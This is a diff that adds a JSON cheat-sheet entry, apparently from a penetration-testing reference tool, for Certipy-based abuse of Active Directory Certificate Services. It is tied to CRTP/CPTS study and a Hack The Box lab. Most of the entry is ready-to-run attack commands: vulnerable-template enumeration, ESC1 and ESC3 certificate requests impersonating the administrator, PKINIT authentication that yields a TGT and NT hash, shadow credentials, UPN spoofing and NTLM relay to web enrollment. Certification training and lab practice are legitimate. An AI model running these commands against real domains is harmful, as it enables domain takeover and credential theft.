@@ -1,0 +1,69 @@
+{
+  "id": "ad-certipy-toolkit",
+  "name": "Certipy Toolkit (AD CS Abuse Reference)",
+  "command": "certipy-ad find -u <user>@<domain> -p <password> -dc-ip <dc_ip> -vulnerable -stdout",
+  "description": "Reference for certipy-ad - the Linux tool for AD CS enumeration and abuse: find vulnerable templates/CAs (ESC1-ESC16), request certificates, authenticate via PKINIT, run Shadow Credentials, and manipulate account UPNs. Supports password, hash, and Kerberos auth.",
+  "platform": "linux",
+  "type": "cheatsheet",
+  "opsec": "moderate",
+  "category": "Active Directory",
+  "subcategory": "ADCS",
+  "certifications": [
+    "CRTP",
+    "CPTS"
+  ],
+  "primary_cert": "CRTP",
+  "source": "HTB Fluffy engagement; Certipy",
+  "tags": [
+    "certipy",
+    "adcs",
+    "certificate",
+    "esc",
+    "toolkit",
+    "reference"
+  ],
+  "mitre": [
+    "T1649"
+  ],
+  "exam": "exam-ok",
+  "notes": "=== ENUMERATE ===\n  certipy-ad find -u <user>@<domain> -p <password> -dc-ip <dc_ip> -vulnerable -stdout\n  # flags [!] ESC1..ESC16 on templates/CAs. -stdout prints; drop it to save JSON/BloodHound.\n\n=== REQUEST (enroll) ===\n  certipy-ad req -u <user>@<domain> -p <password> -ca <ca_name> -template <template>\n  # ESC1: add -upn administrator@<domain>  (or -sid <target_sid> for strong mapping)\n  # ESC3: -template <enrollment_agent>  then -on-behalf-of '<domain>\\administrator' -pfx agent.pfx\n\n=== AUTHENTICATE (use the cert) ===\n  certipy-ad auth -pfx administrator.pfx -dc-ip <dc_ip>\n  # -> TGT + NT hash (UnPAC). Add -username/-domain if the PFX lacks identity.\n\n=== SHADOW CREDENTIALS ===\n  certipy-ad shadow auto -u <user>@<domain> -p <password> -account <target_account> -dc-ip <dc_ip>\n  # add-key -> PKINIT -> UnPAC -> cleanup, in one command.  -> ad-shadow-credentials\n\n=== ACCOUNT MANIPULATION (ESC16 / UPN spoof) ===\n  certipy-ad account update -u <user>@<domain> -p <password> -user <controlled_account> -upn administrator\n  certipy-ad account update ... -upn <controlled_account>@<domain>   # revert\n  -> ad-esc16-upn-manipulation\n\n=== RELAY / OTHER ===\n  certipy-ad relay -target http://<ca_host>/certsrv/certfnsh.asp -template <template>   # ESC8 (NTLM relay to web enrollment)\n\n=== TIP ===\n  Sync your clock (PKINIT) before auth/shadow/ESC steps -> ad-faketime-kerberos.",
+  "examples": [
+    {
+      "label": "Find vulnerable templates and CAs",
+      "command": "certipy-ad find -u j.fleischman@fluffy.htb -p '<pass>' -dc-ip 10.129.65.243 -vulnerable -stdout"
+    },
+    {
+      "label": "ESC1 request with a privileged SAN",
+      "command": "certipy-ad req -u <user>@<domain> -p <password> -ca <ca_name> -template <vuln_template> -upn administrator@<domain>"
+    },
+    {
+      "label": "Authenticate with an issued cert",
+      "command": "certipy-ad auth -pfx administrator.pfx -dc-ip <dc_ip>"
+    }
+  ],
+  "references": [
+    {
+      "title": "Certipy",
+      "url": "https://github.com/ly4k/Certipy"
+    },
+    {
+      "title": "SpecterOps - Certified Pre-Owned",
+      "url": "https://posts.specterops.io/certified-pre-owned-d95910965cd2"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "ad-esc1-certipy-linux",
+      "note": "ESC1 enrollee-supplied-SAN attack.",
+      "rel": "next"
+    },
+    {
+      "id": "ad-esc16-upn-manipulation",
+      "note": "ESC16 UPN spoof to Domain Admin.",
+      "rel": "next"
+    }
+  ],
+  "tools": [
+    "certipy"
+  ]
+}
